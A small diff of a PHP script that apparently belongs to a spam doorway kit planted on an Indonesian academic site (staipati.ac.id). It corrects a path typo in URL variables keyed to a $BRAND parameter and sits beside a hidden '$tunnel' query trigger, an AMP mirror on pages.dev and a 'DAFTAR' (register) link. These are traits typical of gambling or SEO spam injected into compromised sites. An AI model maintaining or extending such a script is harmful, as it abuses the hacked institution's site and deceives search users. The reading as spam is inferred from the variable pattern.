@@ -59,8 +59,8 @@ if (isset($_GET[$tunnel])) {
 }
 $brand = strtolower($BRAND);
 $baseAuthor = $BRAND;
-$URL  = "https://staipati.ac.id/comman/?id=$BRAND";
-$PAGEURL = "https://staipati.ac.id/comman/?id=$BRAND";
+$URL  = "https://staipati.ac.id/common/?id=$BRAND";
+$PAGEURL = "https://staipati.ac.id/common/?id=$BRAND";
 $AMP = "https://staipatimon.pages.dev/?id=$BRAND";
 $DAFTAR = "https://staipatimon.pages.dev/";
 $BANNER = "https://i.pinimg.com/1200x/fa/ac/0b/faac0be44239e38ceef534f38bea3f30.jpg";
